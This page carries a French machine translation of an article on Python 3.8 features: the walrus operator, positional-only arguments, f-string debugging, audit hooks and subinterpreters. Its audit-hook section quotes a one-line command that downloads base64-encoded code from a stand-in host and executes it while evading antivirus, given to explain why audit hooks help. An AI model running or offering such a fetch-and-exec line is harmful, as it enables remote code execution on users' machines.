<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏿‍💻 🈵 🔦 Python 3.8: Quoi de neuf et comment l'utiliser? 👆🏿 👩🏻‍🎓 ✊</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="La traduction suivante a été préparée spécialement pour les pythonistes qui souhaitent lire avec certitude les nouvelles fonctionnalités de Python 3.8...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Python 3.8: Quoi de neuf et comment l'utiliser?</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/472432/">  <i>La traduction suivante a été préparée spécialement pour les pythonistes qui souhaitent lire avec certitude les nouvelles fonctionnalités de Python 3.8.</i>  <i>En prévision du lancement d'un nouveau fil sur le cours <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">"Développeur Python",</a> nous n'avons pas pu dépasser ce sujet.</i> <br><br>  Dans cet article, nous parlerons des nouvelles fonctionnalités introduites dans Python 3.8. <br><br><img src="https://habrastorage.org/webt/i5/rh/vr/i5rhvrl8ymik0j7jswx0gwtr-cq.png"><br><hr><br><h3>  Opérateur de morse (opérateur d'affectation) </h3><br>  Nous savons que vous attendiez cela.  Cette attente remonte à l'époque où Python était délibérément interdit d'utiliser "=" comme opérateur de comparaison.  Certaines personnes ont aimé cela parce qu'elles ne confondaient plus = et == dans l'affectation et la comparaison.  D'autres ont trouvé inconfortable de répéter l'opérateur ou de l'assigner à une variable.  Passons à un exemple. <br><a name="habracut"></a><br>  Selon Guido, la plupart des programmeurs ont tendance à écrire: <br><br><pre><code class="python hljs">group = re.match(data).group(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> re.match(data) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">None</span></span></code> </pre> <br>  Au lieu de cela <br><br><pre> <code class="python hljs">match = re.match(data) group = match.group(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> match <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">None</span></span></code> </pre> <br>  Cela rend le programme plus lent.  Bien qu'il soit compréhensible que certains programmeurs n'écrivent toujours pas de la première manière - cela encombre le code. <br><br>  Maintenant, nous avons la possibilité de le faire: <br><br><pre> <code class="plaintext hljs">group = match.group(1) if (match := re.match(data)) else None</code> </pre> <br>  De plus, il est utile lors de l'utilisation de ifs, afin de ne pas tout calculer à l'avance. <br><br><pre> <code class="python hljs">match1 = pattern1.match(data) match2 = pattern2.match(data) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> match1: result = match1.group(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> match2: result = match2.group(<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: result = <span class="hljs-keyword"><span class="hljs-keyword">None</span></span></code> </pre> <br>  Et à la place, nous pouvons écrire: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (match1 := pattern1.match(data)): result = match1.group(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> (match2 := pattern2.match(data)): result = match2.group(<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: result = <span class="hljs-keyword"><span class="hljs-keyword">None</span></span></code> </pre> <br>  Ce qui est plus optimal, car le second if ne sera pas pris en compte si le premier fonctionne. <br><br>  En fait, je suis très satisfait de la norme PEP-572, car elle donne non seulement une opportunité auparavant inexistante, mais utilise également un opérateur différent pour cela, il ne sera donc pas facile de la confondre avec ==. <br><br>  Cependant, en même temps, il offre également de nouvelles opportunités d'erreurs et la création de code précédemment inopérant. <br><br><pre> <code class="python hljs">y0 = (y1 := f(x))</code> </pre> <br><h3>  Arguments positionnels </h3><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">f</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(a, b, /, c, d, *, e, f)</span></span></span><span class="hljs-function">:</span></span> print(a, b, c, d, e, f)</code> </pre> <br>  Ici, tout ce qui précède <code>/</code> est strictement des arguments positionnels, et tout ce qui suit <code>*</code> n'est que des mots-clés. <br><br><pre> <code class="python hljs">f(<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">30</span></span>, d=<span class="hljs-number"><span class="hljs-number">40</span></span>, e=<span class="hljs-number"><span class="hljs-number">50</span></span>, f=<span class="hljs-number"><span class="hljs-number">60</span></span>) - valid f(<span class="hljs-number"><span class="hljs-number">10</span></span>, b=<span class="hljs-number"><span class="hljs-number">20</span></span>, c=<span class="hljs-number"><span class="hljs-number">30</span></span>, d=<span class="hljs-number"><span class="hljs-number">40</span></span>, e=<span class="hljs-number"><span class="hljs-number">50</span></span>, f=<span class="hljs-number"><span class="hljs-number">60</span></span>) - b cannot be a keyword argument f(<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">30</span></span>, <span class="hljs-number"><span class="hljs-number">40</span></span>, <span class="hljs-number"><span class="hljs-number">50</span></span>, f=<span class="hljs-number"><span class="hljs-number">60</span></span>) - e must be a keyword argument</code> </pre> <br>  La portée de cette fonction peut être exprimée en une phrase.  Il sera plus facile pour les bibliothèques de changer leurs signatures.  Regardons un exemple: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">add_to_queue</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(item: QueueItem)</span></span></span><span class="hljs-function">:</span></span></code> </pre> <br>  À présent, l'auteur doit prendre en charge une telle signature et le nom du paramètre ne doit plus être modifié, car cette modification deviendra critique.  Imaginez que vous devez modifier non seulement un élément, mais toute une liste d'éléments: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">add_to_queue</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(items: Union[QueueItem, List[QueueItem]])</span></span></span><span class="hljs-function">:</span></span></code> </pre><br>  Ou alors: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">add_to_queue</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(*items: QueueItem)</span></span></span><span class="hljs-function">:</span></span></code> </pre> <br>  C'est quelque chose que vous ne pouviez pas faire auparavant en raison d'éventuelles incompatibilités avec la version précédente.  Maintenant c'est possible.  De plus, cela est plus cohérent avec les conceptions qui utilisent déjà cette approche.  Par exemple, vous ne pouvez pas passer de kwargs à la fonction pow. <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>help(pow) ... pow(x, y, z=<span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, /) ... &gt;&gt;&gt; pow(x=<span class="hljs-number"><span class="hljs-number">5</span></span>, y=<span class="hljs-number"><span class="hljs-number">3</span></span>) Traceback (most recent call last): File <span class="hljs-string"><span class="hljs-string">"&lt;stdin&gt;"</span></span>, line <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> &lt;module&gt; TypeError: pow() takes no keyword arguments</code> </pre> <br><h3>  Débogage avec f-lines </h3><br>  Une petite fonction supplémentaire qui nous aide à utiliser un format d'enregistrement compact de la forme "variable name =" variable. <br><br><pre> <code class="python hljs"><span class="hljs-string"><span class="hljs-string">f"</span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">{chr(</span></span><span class="hljs-number"><span class="hljs-string"><span class="hljs-subst"><span class="hljs-number">65</span></span></span></span><span class="hljs-string"><span class="hljs-subst">) = }</span></span></span><span class="hljs-string">"</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"chr(65) = 'A'"</span></span></code> </pre> <br>  Avez-vous remarqué cela après chr (65)?  Cette même astuce.  Il permet de fournir un moyen plus court d'imprimer des variables à l'aide de lignes f. <br><br><h3>  Shell asyncio natif </h3><br>  Maintenant, si nous exécutons le shell Python en tant que 'python -m asyncio', nous n'avons plus besoin de <code>asyncio.run()</code> pour exécuter les fonctions asynchrones.  Await peut être utilisé directement depuis le shell lui-même: <br><br><pre> <code class="python hljs">&gt;python -m asyncio asyncio REPL <span class="hljs-number"><span class="hljs-number">3.8</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span>b4 Use “<span class="hljs-keyword"><span class="hljs-keyword">await</span></span>” directly instead of “asyncio.run()”. Type “help”, “copyright”, “credits” <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> “license” <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> more information. &gt;&gt;&gt; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> asyncio &gt;&gt;&gt; <span class="hljs-keyword"><span class="hljs-keyword">async</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">test</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> … <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> asyncio.sleep(<span class="hljs-number"><span class="hljs-number">1</span></span>) … <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'hello'</span></span> … &gt;&gt;&gt; <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> test() <span class="hljs-string"><span class="hljs-string">'hello'</span></span></code> </pre> <br><h3>  Python appelle des hooks d'audit d'exécution </h3><br>  Le Python Rantime s'appuie fortement sur C. Cependant, le code qui y est exécuté n'est en aucun cas enregistré ou suivi.  Cela rend difficile le contrôle du fonctionnement des frameworks de test, des frameworks de journalisation, des outils de sécurité et, éventuellement, limite les actions effectuées par le runtime. <br><br>  Vous pouvez maintenant observer les événements déclenchés par le runtime, y compris le fonctionnement du système d'importation de module et les éventuels hooks utilisateur. <br><br>  La nouvelle API est la suivante: <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment"># Add an auditing hook sys.addaudithook(hook: Callable[[str, tuple]]) # Raise an event with all auditing hooks sys.audit(str, *args)</span></span></code> </pre> <br>  Les crochets ne peuvent pas être supprimés ou remplacés.  Pour CPython, les hooks provenant de C sont considérés comme globaux, tandis que les hooks provenant de Python ne sont destinés qu'à l'interpréteur actuel.  Les hooks globaux sont exécutés avant les hooks de l'interpréteur. <br><br>  Un exploit particulièrement intéressant et non suivi pourrait ressembler à ceci: <br><br><pre> <code class="python hljs">python -c “<span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urllib.request, base64; exec(base64.b64decode( urllib.request.urlopen(<span class="hljs-string"><span class="hljs-string">'http://my-exploit/py.b64'</span></span>) ).decode())”</code> </pre> <br>  Ce code n'est pas analysé par la plupart des programmes antivirus, car ils se concentrent sur du code reconnaissable qui est lu lors du chargement et de l'écriture sur le disque, et base64 est suffisant pour contourner ce système.  Ce code passera également des niveaux de protection tels que des listes de contrôle d'accès aux fichiers ou des autorisations (lorsque l'accès aux fichiers n'est pas requis), des listes d'applications approuvées (à condition que Python dispose de toutes les autorisations nécessaires) et un audit ou une journalisation automatique (à condition que Python a accès à Internet ou à une autre machine du réseau local avec laquelle vous pouvez obtenir la charge utile). <br><br>  Avec les hooks d'événements d'exécution, nous pouvons décider comment répondre à un événement particulier.  Nous pouvons soit enregistrer l'événement, soit terminer complètement l'opération. <br><br><h3>  multiprocessing.shared_memory </h3><br>  Aide à utiliser la même zone mémoire de différents processus / interprètes.  Fondamentalement, cela peut nous aider à réduire le temps nécessaire à la sérialisation des objets pour les transférer entre les processus.  Au lieu de sérialiser, mettre en file d'attente et désérialiser, nous pouvons simplement utiliser la mémoire partagée d'un autre processus. <br><br><h3>  Protocole Pickle et tampons de données hors bande </h3><br>  Le protocole pickle 5 prend en charge les tampons hors bande, où les données peuvent être transmises séparément du flux de pickle principal à la discrétion de la couche de transport. <br><br>  Les 2 modules complémentaires précédents sont très importants, mais ils n'étaient pas inclus dans la version finale de Python 3.8, car il reste encore du travail à faire avec la compatibilité avec l'ancien code, mais cela peut changer l'approche de la programmation parallèle en Python. <br><br><h3>  Sous-interprètes </h3><br>  Les threads en Python ne peuvent pas s'exécuter en parallèle à cause du GIL, alors que les processus nécessitent beaucoup de ressources.  Seul le début du processus prend 100 à 200 ms, et ils consomment également une grande quantité de RAM.  Mais quelque chose peut y faire face, et ce sont des sous-interprètes.  GIL est un interpréteur, donc il n'affectera pas le travail des autres interprètes, et il démarre plus facilement qu'un processus (quoique plus lent qu'un thread). <br><br>  Le principal problème qui se pose à cet égard est le transfert de données entre interprètes, car ils ne peuvent pas transférer d'état, comme le font les flux.  Par conséquent, nous devons utiliser une sorte de connexion entre eux.  Pickle, marshal ou json peuvent être utilisés pour sérialiser et désérialiser des objets, mais cette méthode fonctionnera assez lentement.  Une solution consiste à utiliser la mémoire partagée à partir d'un module de processus. <br><br>  Les sous-processus semblent être une bonne solution aux problèmes de GIL, mais il reste encore un certain travail à faire.  Dans certains cas, Python utilise toujours «Runtime State» au lieu de «Interpreter State».  Par exemple, le garbage collector fait exactement cela.  Par conséquent, vous devez apporter des modifications à de nombreux modules internes afin de commencer à utiliser les sous-interprètes de manière normale. <br><br>  J'espère que cette fonctionnalité peut être entièrement déployée déjà dans Python version 3.9. <br><br>  En conclusion, je tiens à dire qu'un certain sucre syntaxique a été ajouté à cette version, ainsi que de sérieuses améliorations dans le travail des bibliothèques et le processus d'exécution.  Cependant, de nombreuses fonctionnalités intéressantes ne sont jamais entrées dans la version, nous les attendrons donc dans Python 3.9. <br><br><h4>  Sources: </h4><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Quoi de neuf en Python</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">L'opérateur est le morse</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Arguments positionnels</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Crochet d'audit</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Problèmes de sécurité sans crochets d'audit</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Sous-interprètes</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr472432/">https://habr.com/ru/post/fr472432/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr472420/index.html">Rendre l'interface plus réactive grâce à la promesse différée</a></li>
<li><a href="../fr472422/index.html">Sber X RamblerFront & Meet Up</a></li>
<li><a href="../fr472426/index.html">Semaine de la sécurité 43: La vie secrète des Hanipots IoT</a></li>
<li><a href="../fr472428/index.html">Opérateur Tarantool Kubernetes</a></li>
<li><a href="../fr472430/index.html">Comment nous avons choisi la base de composants pour une maison intelligente: à propos des capteurs et d'un contrôleur</a></li>
<li><a href="../fr472434/index.html">Mettez à jour vos versions</a></li>
<li><a href="../fr472438/index.html">Comment les procurations sont utilisées dans la sécurité de l'information: 6 cas d'utilisation pratiques</a></li>
<li><a href="../fr472440/index.html">Un jour au Joker 2019</a></li>
<li><a href="../fr472442/index.html">La situation: tout le monde parle du retour des formats audio oubliés - pourquoi ils sont destinés à rester des niches</a></li>
<li><a href="../fr472444/index.html">Les meilleurs produits partent de vrais problèmes: Intercom sur les tâches à faire. Partie 3 finale</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>